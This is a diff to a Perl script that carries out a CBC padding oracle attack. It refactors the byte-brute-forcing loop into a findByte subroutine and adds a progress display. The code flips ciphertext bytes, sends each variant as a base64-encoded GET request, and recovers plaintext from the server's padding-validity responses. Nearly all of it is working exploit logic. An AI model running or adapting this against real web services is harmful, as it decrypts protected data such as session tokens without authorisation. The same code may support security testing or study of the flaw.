@@ -93,29 +93,11 @@ my $bNum = ($qLen+1)/$bSize;
 print "\nInitial Padding Size = $AIM, Number of Blocks = $bNum\n\n";
 my $bt = 0;
 
-while ($bt < $bNum){
-    $target = $AIM+1;
-    $it = $AIM;
-    while($it < $bSize){
-        $tempPARM = $parm;
-        prep( );
-        $currentB = $qLen-($bSize+$it);
-        my $ogByte = ord(substr($parm, $currentB, 1));
-        my $byte = ord(substr($parm, $currentB, 1)) ;
-        my $whBYTE = $byte;
-        $byte = ($byte + 1)%255; 
-        my $tries = 0;
-        while($byte != $whBYTE){
-            substr($tempPARM, $currentB, 1) = chr($byte);
-            $return = getRequest($tempPARM);
-            if ($return == 1){ my $xD = $byte^$ogByte^$target; push @text, $xD; $AIM++; $target++; last; }
-            else{ $byte = ($byte + 1)%255; }
-            if ( $byte == $whBYTE ){ while (1){ # Runs if 1 is never returned for any given byte
-                    print "\n\nCould not find padding for byte $currentB. Do you want to try again ($tries attempts)? (Y/n): ";
-                    chomp ( my $uinput = <STDIN> );
-                    if ( $uinput eq "Y" ){ $byte = $whBYTE+1; $tries++; print "This should only take a few moments...\n"; last;}
-                    elsif ( $uinput eq "n" ){ die "Could not find byte $currentB!"; }
-                    else{ print 'Either type "Y" or "n"!'."\n"; }}}
+while ($bt < $bNum-1){ # fix jank fix
+    $target = $AIM+1, $it = $AIM;
+    while($it < $bSize){ findByte(); 
+        my $tempP = "="x(($it+1)*5)." "x(($bSize-($it+1))*5); printf ("\r%d/%d {%s}",1+$it, $bSize, $tempP); }
+    printf ("\rBlock %d/%d Complete                                                                          \n", 1+$bt, $bNum);
     $qLen = $qLen-$bSize;
     $parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.
     $bt++;
@@ -135,6 +117,22 @@ sub prep { # Preps padding for bit flipping (turns padding from something like \
         substr($tempPARM, $currentB, 1) = chr(ord(substr($parm, $currentB, 1))^$target^$text[$tilAIM+$bt*$bSize]);
         $tilAIM++; }}
 
+sub findByte {# Flips bits untill it get valid padding
+    $tempPARM = $parm;
+    prep( );
+    $currentB = $qLen-($bSize+$it);
+    my $ogByte = ord(substr($parm, $currentB, 1));
+    my $tries = 0;
+    power: foreach my $number (0 .. 255){
+        substr($tempPARM, $currentB, 1) = chr($number);
+        $return = getRequest($tempPARM);
+        if ($return ){ my $xD = $number^$ogByte^$target; push @text, $xD; $AIM++; $target++; $it++; last; }}
+    unless ( $return ){ while (1){ # Runs if 1 is never returned for any given byte
+            print "\n\nCould not find padding for byte $currentB. Do you want to try again ($tries attempts)? (Y/n): ";
+            chomp ( my $uinput = <STDIN> );
+            if ( $uinput eq "Y" ){ $tries++; print "This should only take a few moments...\n"; goto power; }
+            elsif ( $uinput eq "n" ){ die "Could not find byte $currentB!"; }
+            else{ print 'Either type "Y" or "n"!'."\n"; }}}}
 
 sub getRequest { # Send a get request and classify the response
     my $heel = encode_base64($_[0], '');
